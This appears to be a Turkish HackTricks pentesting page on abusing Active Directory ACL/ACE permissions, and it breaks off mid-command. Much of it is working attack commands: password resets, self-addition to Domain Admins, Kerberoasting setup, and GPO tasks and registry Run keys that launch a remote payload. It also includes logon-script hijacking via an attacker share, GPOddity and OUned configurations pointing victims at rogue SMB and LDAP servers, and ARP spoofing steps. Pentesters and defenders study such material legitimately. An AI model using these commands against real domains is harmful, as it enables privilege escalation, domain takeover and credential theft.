# Active Directory ACL/ACE'lerini Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerindeki tekniklerin bir özetidir. Daha fazla ayrıntı için orijinal makalelere bakın.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırgana hedef kullanıcı hesabı üzerinde tam denetim sağlar. `Get-ObjectAcl` komutuyla `GenericAll` hakları doğrulandıktan sonra saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: Saldırgan, `net user <username> <password> /domain` komutuyla kullanıcının parolasını sıfırlayabilir.
- Linux'tan da aynı işlem Samba `net rpc` ile SAMR üzerinden yapılabilir:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Hesap devre dışıysa UAC bayrağını temizleyin**: `GenericAll`, `userAccountControl` özniteliğinin düzenlenmesine izin verir. Linux'tan BloodyAD, `ACCOUNTDISABLE` bayrağını kaldırabilir:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak hesabı kerberoastable hâle getirin, ardından ticket-granting ticket (TGT) hash'lerini çıkarmak ve kırmayı denemek için Rubeus ve targetedKerberoast.py kullanın.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Kullanıcı için pre-authentication özelliğini devre dışı bırakarak hesabını ASREPRoasting saldırısına karşı savunmasız hâle getirin.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` yetkiniz varsa, parolasını değiştirmeden bu kullanıcı olarak kimlik doğrulamak için sertifika tabanlı bir kimlik bilgisi ekleyebilirsiniz. Bkz.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Grup Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` haklarına sahip olması durumunda grup üyeliklerini değiştirmesine olanak tanır. `Get-NetGroup` ile grubun distinguished name değerini belirledikten sonra saldırgan şunları yapabilir:

- **Kendilerini Domain Admins Grubuna Ekleme**: Bu işlem doğrudan komutlarla veya Active Directory ya da PowerSploit gibi modüller kullanılarak yapılabilir.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux'tan, gruplar üzerinde GenericAll/Write membership yetkiniz varsa kendinizi rastgele gruplara eklemek için BloodyAD'den de yararlanabilirsiniz. Hedef grup “Remote Management Users” grubunun içine iç içe yerleştirilmişse, bu grubu dikkate alan sunucularda hemen WinRM erişimi kazanırsınız:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Bir bilgisayar nesnesi veya kullanıcı hesabı üzerinde bu ayrıcalıklara sahip olmak şunları sağlar:

- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesinin kontrolünü ele geçirmeyi sağlar.
- **Shadow Credentials**: Shadow credentials oluşturma ayrıcalıklarından yararlanarak bir bilgisayar veya kullanıcı hesabını taklit etmek için bu tekniği kullanın.

## Bir nesneyi devralınan OU izinlerine taşıma

Bir yol, **bir hesap üzerindeki taşıma haklarını** hedef OU'dan devralınan **yazma haklarıyla** birleştirebilir; her iki yetkili de başlangıçta hesabın hassas özniteliklerini değiştiremiyor olsa bile. Kaynak nesnenin taşıma izinlerini ve hedefteki `CreateChild` iznini doğrulayın, nesneyi taşıyın ve ardından etkin DACL'sini yeniden kontrol edin. Örneğin, powerview.py'deki `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` komutu kullanıcıyı taşır; bu OU üzerinde devralınan `GenericWrite` iznine sahip, kontrolünüzdeki bir grup daha sonra bir [shadow credential](shadow-credentials.md) ekleyebilir. Taşıma işlemi devralınan izni kendi başına oluşturmaz.<sup>[[18]](#references)</sup>

Bir OU üzerinde `GenericAll` izniniz varsa ancak uygun bir devralınan ACE yoksa, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` komutu, altındaki nesneler için bir ACE ekleyebilir. Hedef hesabı ayrıca test edin: **AdminSDHolder tarafından korunan hesaplarda devralma devre dışıdır**; bu nedenle bir OU ACE'si normal kullanıcıları etkilerken korunan bir kullanıcı üzerinde işe yaramayabilir. Bkz. [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Ayrı bir istismar yolu, ayrıcalıklı bir zamanlanmış temizleme betiğinin saldırganın etkileyebildiği ACE'lere göre OU'ları seçip alt nesneleri üzerinde `Set-ADObject -Clear adminCount` **ve** `$acl.SetAccessRuleProtection($False, $False)` komutlarını çalıştırması durumunda ortaya çıkar. OU DACL'sini değiştirebiliyorsanız, betiğin denetlediği gruba gereken `ExtendedRight` veya `GenericAll` ACE'sini verin; görevi çalıştırma yetkiniz olup olmadığını ayrıca doğrulayın. Ardından ayrıcalıklı görev, önceden korunan bir hesapta devralmayı yeniden etkinleştirerek OU ACE'sinin uygulanmasını sağlayabilir. Betiği, tetikleme iznini ve ortaya çıkan DACL'yi doğrulayın; yalnızca `adminCount` değerini temizlemek devralmayı yeniden etkinleştirmez ve korunan gruplarda kalan hesaplar SDProp tarafından yeniden korunabilir.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

Bir kullanıcının belirli bir grup (ör. `Domain Admins`) üzerindeki tüm nesneler için `WriteProperty` hakları varsa şunları yapabilir:

- **Kendini Domain Admins Grubuna Ekleme**: `net user` ve `Add-NetGroupUser` komutları birleştirilerek gerçekleştirilebilen bu yöntem, etki alanı içinde ayrıcalık yükseltmeye olanak tanır.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Grup Üzerinde Self (Self-Membership)**

Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlarla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisi, kişinin kendisini gruba eklemesini sağlar:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Benzer bir ayrıcalık olan bu hak, saldırganların gruplar üzerinde `WriteProperty` hakkına sahip olmaları durumunda grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve kullanılması şu şekilde gerçekleştirilir:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya olanak tanır. Bu yetkinin doğrulanması ve kötüye kullanılması PowerShell veya alternatif komut satırı araçlarıyla gerçekleştirilebilir. Kullanıcının parolasını sıfırlamak için etkileşimli oturumlar ve etkileşimsiz ortamlar için one-liner'lar da dahil olmak üzere çeşitli yöntemler sunulur. Komutlar, basit PowerShell çağrılarından Linux'ta `rpcclient` kullanımına kadar uzanarak saldırı vektörlerinin esnekliğini gösterir.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **Grup Üzerinde WriteOwner**

Bir saldırgan, bir grup üzerinde `WriteOwner` haklarına sahip olduğunu fark ederse grubun sahipliğini kendisine geçirebilir. Söz konusu grup `Domain Admins` ise bu özellikle büyük etki yaratır; çünkü sahipliği değiştirmek, grup öznitelikleri ve üyeliği üzerinde daha geniş denetim sağlar. Süreç, `Get-ObjectAcl` kullanarak doğru nesneyi belirlemeyi ve ardından sahibi SID veya ad üzerinden değiştirmek için `Set-DomainObjectOwner` kullanmayı içerir.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite on User**

Bu izin, saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcı oturum açtığında kötü amaçlı bir betiğin çalıştırılması için kullanıcının logon script yolunu değiştirebilir. Bunun için `Set-ADObject` komutunu kullanarak hedef kullanıcının `scriptpath` özelliğini saldırganın betiğini gösterecek şekilde günceller.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Daha dar kapsamlı, kullanıcının [`scriptPath` özniteliğine](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) uygulanan bir `WriteProperty` ACE'si yeterli olabilir; `GenericWrite` gerekli değildir. Bu öznitelik hakkını, etki alanının `SYSVOL\<domain>\scripts` veya `NETLOGON` ağacındaki yazılabilir bir betikle eşleştirin ve hedef kullanıcının oturum açıp betiğe ulaşma olasılığını değerlendirin. Betik, oturum açma sırasında o kullanıcının bağlamında çalışır. Etkin AD ve dosya/paylaşım ACL'lerini ayrı ayrı inceleyin; eşleşen bir Allow ACE veya tek başına yazılabilir bir dizin, erişim yolunun tamamını oluşturmaz.

## **Grupta GenericWrite**

Bu ayrıcalıkla saldırganlar, kendilerini veya başka kullanıcıları belirli gruplara eklemek gibi grup üyeliğini değiştirebilir. Bu işlem; bir kimlik bilgisi nesnesi oluşturmayı, bunu kullanıcıları bir gruba eklemek veya gruptan çıkarmak için kullanmayı ve üyelik değişikliklerini PowerShell komutlarıyla doğrulamayı içerir.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux'tan, grup üzerinde `GenericWrite` izniniz varsa Samba `net` ile üye ekleyebilir/kaldırabilirsiniz (PowerShell/RSAT kullanılamadığında kullanışlıdır):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Bir AD nesnesinin sahibi olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın nesne üzerinde kendisine `GenericAll` ayrıcalıkları vermesini sağlar. Bu, ADSI manipülasyonu yoluyla gerçekleştirilir ve nesne üzerinde tam denetim sahibi olmayı ve grup üyeliklerini değiştirebilmeyi mümkün kılar. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu ayrıcalıklardan yararlanmaya çalışırken bazı sınırlamalar vardır.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner ile hızlı ele geçirme (PowerView)

Bir kullanıcı veya hizmet hesabı üzerinde `WriteOwner` ve `WriteDacl` yetkilerine sahipseniz, eski parolayı bilmeden PowerView kullanarak tam denetimi ele geçirebilir ve parolasını sıfırlayabilirsiniz:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notlar:
- Yalnızca `WriteOwner` yetkiniz varsa önce sahipliği kendinize geçirmeniz gerekebilir:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Parola sıfırlama işleminden sonra herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrulayın.

## **Etki Alanında Replikasyon (DCSync)**

DCSync saldırısı, bir Domain Controller'ı taklit ederek kullanıcı kimlik bilgileri de dahil olmak üzere verileri eşitlemek için etki alanındaki belirli replikasyon izinlerinden yararlanır. Bu güçlü teknik, saldırganların Domain Controller'a doğrudan erişmeden AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir.<sup>[[5]](#references)</sup> [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Yetkilendirmesi <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Yetkilendirmesi

Group Policy Objects (GPO'lar) yönetmek için yetki verilmiş erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları verilmişse **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçlarla kötüye kullanılabilir. PowerView ile şöyle tespit edilebilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO İzinlerini Numaralandırma

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit cmdlet'leri zincirleme kullanılabilir. Böylece belirli bir kullanıcının yönetme iznine sahip olduğu GPO'lar bulunabilir: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir İlkenin Uygulandığı Bilgisayarlar**: Potansiyel etkinin kapsamını anlamaya yardımcı olması için belirli bir GPO'nun hangi bilgisayarlara uygulandığı bulunabilir. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan İlkeler**: Belirli bir bilgisayara hangi ilkelerin uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir İlkenin Uygulandığı OU'lar**: Belirli bir ilkeden etkilenen organizasyon birimleri (OU'lar), `Get-DomainOU` kullanılarak belirlenebilir.

GPO'ları numaralandırmak ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### GPO'yu Kötüye Kullanma - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin anında çalışan zamanlanmış bir görev oluşturularak kod yürütmek için istismar edilebilir. Bu yöntem, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna ekleyerek ayrıcalıkları önemli ölçüde yükseltmek için kullanılabilir:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

GroupPolicy modülü yüklüyse yeni GPO’lar oluşturup bunları bağlamaya ve etkilenen bilgisayarlarda backdoor’ları çalıştırmak için kayıt defteri değerleri gibi tercihleri ayarlamaya olanak tanır. Bu yöntem, GPO’nun güncellenmesini ve çalıştırılması için bir kullanıcının bilgisayarda oturum açmasını gerektirir:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPO'yu Kötüye Kullanma

SharpGPOAbuse, yeni GPO'lar oluşturmaya gerek kalmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları kötüye kullanma yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Politika Güncellemesini Zorla

GPO güncellemeleri genellikle yaklaşık 90 dakikada bir gerçekleşir. Bu süreci, özellikle bir değişiklik yaptıktan sonra hızlandırmak için hedef bilgisayarda `gpupdate /force` komutu kullanılabilir. Bu komut, GPO’larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### Arka Planda

`Misconfigured Policy` gibi belirli bir GPO için Scheduled Tasks incelendiğinde, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan betikler ya da komut satırı araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterilen görev yapısı, çalıştırılacak komut ve tetikleyicileri de dahil olmak üzere zamanlanmış görevin ayrıntılarını belirtir. Bu dosya, zamanlanmış görevlerin GPO’larda nasıl tanımlanıp yönetildiğini gösterir ve politika uygulanırken rastgele komutların veya betiklerin çalıştırılmasını sağlar.

### Kullanıcılar ve Gruplar

GPO’lar, hedef sistemlerdeki kullanıcı ve grup üyeliklerinin değiştirilmesine de olanak tanır. Kullanıcılar ve Gruplar politika dosyaları doğrudan düzenlenerek saldırganlar, kullanıcıları yerel `administrators` grubu gibi ayrıcalıklı gruplara ekleyebilir. Bu, GPO yönetimi izinlerinin devredilmesiyle mümkündür; böylece yeni kullanıcılar eklemek veya grup üyeliklerini değiştirmek için politika dosyaları düzenlenebilir.

Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını gösterir. Bu dosyaya girdiler eklenerek belirli kullanıcılara etkilenen sistemlerde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık yükseltmek için doğrudan bir yol sunar.

Yerel grup üyeliği ve kullanıcı hakları gibi güvenlik ayarları için, `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` konumundaki uygulanmış GPO şablonunu ve `SecEdit` dizininin ACL’sini de inceleyin. Yazılabilir bir dizin veya dosya, incelenmesi gereken bir ipucudur: değişikliğin etkili olup olmayacağını belirleyen unsurlar arasında SYSVOL paylaşımına etkin erişim, deny ve devralınan ACL’ler, Group Policy container izinleri, politika kapsamı ve istemci yenilemesi de bulunur. Yalnızca “GPO Managers” adlı bir gruba üye olmak, düzenleme hakkı olduğunu göstermez. [Microsoft bu şablon yolunu ve Group Policy container/şablon ayrımını belgeliyor.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Ayrıca kod çalıştırmak veya kalıcılığı sürdürmek için logon/logoff script’lerinden yararlanmak, autoruns için registry key’lerini değiştirmek, .msi dosyaları üzerinden yazılım kurmak ya da hizmet yapılandırmalarını düzenlemek gibi ek yöntemler de değerlendirilebilir. Bu teknikler, GPO’ların kötüye kullanılması yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.

### GPC/GPT alımını kimliği doğrulanmış sahte hizmetlere yönlendirme

Bir GPO, meta verileri içeren bir LDAP **Group Policy Container (GPC)** ve politika dosyalarını barındıran bir SMB **Group Policy Template (GPT)** bileşeninden oluşur. Yenileme sırasında istemci, container’ın `gPLink` değerini izler, belirtilen GPC’yi ve `gPCFileSysPath` değerini okur, ardından GPT’yi bu UNC yolundan indirir. Dolayısıyla GPC’nin kendisine veya bir OU, Site ya da Domain’in `gPLink` değerine yazma erişimi, ayrıcalıklı politika işleme sürecini etkilemek için kullanılabilir.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### `gPCFileSysPath` zehirleme ile GPOddity

Denetlenen principal hedef GPC’ye doğrudan veya **NTLM relay to LDAP** yoluyla yazabiliyorsa `gPCFileSysPath` değerini saldırganın barındırdığı bir UNC yoluyla değiştirin. [GPOddity](https://github.com/synacktiv/GPOddity), LDAP değişikliğini otomatikleştirir ve Group Policy istemcisinin `NT AUTHORITY\SYSTEM` olarak çalıştırdığı, modül tabanlı politika dosyaları veya bir Immediate Task içeren kötü amaçlı bir GPT sunar.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonim veya kimlik bilgilerinden bağımsız bir SMB paylaşımı, güncel Windows istemcilerinde yeterli değildir: SMB Secure Negotiate, kimlik doğrulamanın başarılı olduğunun kanıtlanmasını gerektirir. Bu nedenle sahte hizmet, etki alanı kimliğini doğrulamalı, SMB oturum anahtarını türetmeli ve yanıtlarını doğru şekilde imzalamalıdır. Gömülü modda GPOddity’yi denetlenen bir makine hesabı ve hizmet anahtarıyla yapılandırın, ardından `[COMMANDS]` bölümünde bilgisayar veya kullanıcı tarafı payload’ını seçin.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Kullanıcı GPO uç durumu:** MS16-072 sonrasında Windows, aynı TCP bağlantısında hâlâ iki SMB2 oturumu oluşturur: kullanıcı oturumu `GPT.INI` dosyasını okur, ardından bilgisayar hesabı oturumu `ScheduledTasks.xml` gibi etkin yapılandırmaları okur. Bu nedenle rogue server, kimlik doğrulama durumunu, oturum anahtarlarını ve imzalama anahtarlarını yalnızca sokete göre değil, SMB2 `SessionId` değerine göre de indekslemelidir. GPOddity/OUned içine gömülü Scapy fork'u bunu `SMBStreamSocketMultiplexing` ve multiplexing destekli bir `SMBServer` aracılığıyla uygular; tek oturumlu Impacket/Scapy sunucuları aksi hâlde yanlış imzalama durumunu yeniden kullanır ve kullanıcı politikalarında başarısız olur.<sup>[[15]](#references)</sup>

#### OUned ile `gPLink` poisoning

Bir OU, Site veya Domain üzerinde `WriteGPLink`, `GenericWrite` ya da eşdeğer denetime sahip olan saldırgan, GPC DN'si saldırganın denetimindeki bir LDAP host tarafından sunulan bir bağlantı ekleyebilir. Bu yöntem ilk olarak Petros Koutroumpis tarafından sunulmuştur; [OUned](https://github.com/synacktiv/OUned), LDAP yazma işlemini ve kötü amaçlı GPC/GPT zincirini otomatikleştirir.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Kurban önce sahte LDAP service'inde kimlik doğrulaması yapar ve `gPCFileSysPath` değeri sahte SMB service'ini gösteren bir GPC alır; ardından SMB'de kimlik doğrulaması yapar ve sağlanan GPT'yi uygular. Bu nedenle OUned, LDAP SPN'si olan bir hesap, SMB için HOST SPN'si olan bir makine hesabı (aynı makine hesabı her ikisini de karşılayabilir) ve 389 ile 445 numaralı portları operatörün ana makinesine yönlendiren DNS çözümlemesi veya ters yönlendirme gerektirir.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned'in gömülü Scapy LDAP sunucusu, Kerberos/SPNEGO'yu gerçek, kontrol edilen hizmet anahtarıyla doğrular ve JSON'dan rastgele GPC verileri sunar. Boş JSON anahtarı rootDSE'yi modeller, `base64:` önekleri ikili değerleri temsil eder ve sunucu add/delete/modify/search işlemlerinin yanı sıra `BASE`, `LEVEL` ve `SUBTREE` aramalarını destekler; koruma olmadan, bütünlük veya gizlilik seçenekleriyle anlaşma yapabilir. Bu sayede, başka bir Windows bileşeni saldırgan denetimindeki bir LDAP referansını izlerken kimliği doğrulanmış LDAP gerektirdiğinde bu hizmet yeniden kullanılabilir.<sup>[[15]](#references)</sup>

Bir hesap parolasını dummy bir domaine eşitlemenin her Kerberos anahtarını yeniden oluşturduğunu varsaymayın: RC4 paroladan türetilirken AES string-to-key, principal'ın hostname/domain bilgisinden türetilen bir salt da kullanır. Gerçek hesap AES anahtarını `KerberosSSP`'ye sağlamak, makine hesabının kendi kendine yazabildiği `msDS-SupportedEncryptionTypes` özniteliğinde tespit edilebilir bir değişiklik yaparak RC4'ü zorlamayı önler.<sup>[[15]](#references)</sup>

#### Tespit için inceleme noktaları

`gPCFileSysPath` veya `gPLink` değişikliklerini GPO sürüm değişiklikleri ve yeni Immediate/Scheduled Task XML dosyalarıyla ilişkilendirin. Beklenmedik naming context'lere giden bağlantıları, onaylı DC/SYSVOL kümesi dışındaki UNC host'larını, makine hesabı adlarını başka yere yönlendiren DNS kayıtlarını, alışılmadık makine hesaplarına yönelik LDAP/CIFS service ticket'larını ve RC4'ü etkinleştiren `msDS-SupportedEncryptionTypes` değişikliklerini araştırın.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Bir OU/domain üzerindeki `WriteGPLink`, GPO'nun kendisini düzenlemeden hedef container'ın `gPLink` özniteliğini değiştirmenize ve **mevcut bir GPO'yu uygulamaya zorlamanıza** olanak tanır. Bağlanan GPO'nun **UNC paths** (`\\HOST\share\...`) üzerinden uzak içeriğe zaten başvurduğu durumlarda bu yöntem ilgi çekici hâle gelir; çünkü kimliği doğrulanmış kullanıcılar **SYSVOL**'u okuyabilir ve yeniden kullanılabilir politikaları çevrimdışı olarak arayabilir.<sup>[[11]](#references)</sup>

Üst düzey iş akışı:

1. Bir OU üzerinde `WriteGPLink` yetkisine sahip bir principal belirlemek ve bu OU içindeki bilgisayarları/kullanıcıları listelemek için BloodHound kullanın.
2. `SYSVOL`'u salt okunur şekilde klonlayın ve UNC paths'e başvuran **Software Installation**, **drive mappings** (`Drives.xml`) ve **logon/startup scripts** aramak için GPO'ları ayrıştırın.
3. L2 spoofing ile yönlendirilmesi daha kolay olduğundan, DFS/domain-namespace yolları yerine **doğrudan hostname** kullanan (örneğin `\\DC02\share\pkg.msi`) politikalara öncelik verin.
4. Kurbanın mevcut politikayı işlemesi için seçilen GPO GUID'sini hedef OU'nun `gPLink` özniteliğine ekleyin.
5. Aynı broadcast domain'de UNC host'unu ARP spoof ile yönlendirin ve IP'sini yerel olarak bağlayın (`ip addr add <target_ip>/32 dev <iface>`) böylece kurbanın SMB trafiği sizin host'unuza ulaşır.
6. Beklenen path/filename'i bir saldırgan SMB sunucusundan (örneğin `smbserver.py`) sunun ve olağan politika işlemesini bekleyin.

Örnek `SYSVOL` toplama ve GPO ilişkilendirmesi:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Mevcut GPO'yu hedef OU'ya bağlayın:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
